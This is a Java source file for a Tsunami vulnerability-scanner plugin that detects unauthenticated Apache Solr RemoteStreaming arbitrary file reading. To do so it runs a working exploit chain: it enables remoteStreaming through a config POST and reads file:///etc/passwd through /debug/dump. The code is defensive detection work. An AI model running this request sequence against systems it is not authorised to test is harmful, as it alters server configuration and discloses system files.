/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.solr;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.gson.JsonElement;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.regex.Pattern;
import javax.inject.Inject;

/**
 * A {@link VulnDetector} that detects unprotected Apache Solr RemoteStreaming Arbitrary File
 * Reading
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "ApacheSolrArbitraryFileReadingDetector",
    version = "0.1",
    description = "This detector checks for unprotected Apache Solr RemoteStreaming Arbitrary File "
        + "Reading vulnerability.",
    author = "C4o (syttcasd@gmail.com)",
    bootstrapModule = ApacheSolrArbitraryFileReadingDetectorBootstrapModule.class)
public final class ApacheSolrArbitraryFileReadingDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final Pattern VULNERABILITY_RESPONSE_PATTERN = Pattern.compile("root:[x*]:0:0:");

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  ApacheSolrArbitraryFileReadingDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    ImmutableList<String> cores = getCores(networkService);
    for (String core : cores) {
      if (enableRemoteStreaming(networkService, core)) {
        try {
          if (performExploit(networkService, core)) {
            return true;
          }
        } finally {
          closeRemoteStreaming(networkService, core);
        }
      }
    }
    return false;
  }

  private ImmutableList<String> getCores(NetworkService networkService) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + "solr/admin/cores?wt=json&indexInfo=false&_="
            + utcClock.millis();
    try {
      HttpResponse response =
          httpClient.send(get(targetUri).withEmptyHeaders().build(), networkService);
      try {
        if (!response.bodyJson().isPresent()) {
          return ImmutableList.of();
        }
        JsonElement json = response.bodyJson().get();
        return ImmutableList.copyOf(
            json.getAsJsonObject().get("status").getAsJsonObject().keySet());
      } catch (Throwable t) {
        logger.atInfo().log("Failed to parse cores response json");
        return ImmutableList.of();
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
      return ImmutableList.of();
    }
  }

  private boolean enableRemoteStreaming(NetworkService networkService, String core) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "solr/" + core + "/config";
    String payload =
        "{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}";
    try {
      HttpResponse response =
          httpClient.send(
              post(targetUri)
                  .withEmptyHeaders()
                  .setRequestBody(ByteString.copyFrom(payload, "UTF8"))
                  .build(),
              networkService);
      return response.status().code() == 200;
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to POST '%s'.", targetUri);
      return false;
    }
  }

  private void closeRemoteStreaming(
      NetworkService networkService, String core) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "solr/" + core + "/config";
    String payload =
        "{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":false}}";
    try {
      HttpResponse response =
          httpClient.send(
              post(targetUri)
                  .withEmptyHeaders()
                  .setRequestBody(ByteString.copyFrom(payload, "UTF8"))
                  .build(),
              networkService);
      if (response.status().code() != 200) {
        logger.atWarning().log("Unable to close remote streaming");
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to POST '%s'.", targetUri);
    }
  }

  private boolean performExploit(NetworkService networkService, String core) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
        + "solr/" + core + "/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd";
    try {
      HttpResponse response =
          httpClient.send(get(targetUri).withEmptyHeaders().build(), networkService);
      if (response.status() == HttpStatus.OK && response.bodyString().isPresent()) {
        if (VULNERABILITY_RESPONSE_PATTERN.matcher(response.bodyString().get()).find()) {
          return true;
        }
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
    }
    return false;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(VulnerabilityId.newBuilder().setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("APACHE_SOLR_UNPROTECTED_SERVER"))
                .setSeverity(Severity.HIGH)
                .setTitle("Apache Solr RemoteStreaming Arbitrary File Reading")
                .setDescription("Apache Solr is an open source search server. When Apache Solr "
                    + "does not enable authentication, an attacker can directly craft a request "
                    + "to enable a specific configuration, and eventually cause SSRF or arbitrary "
                    + "file reading.")
                .setRecommendation("enable authentication")
        ).build();
  }
}
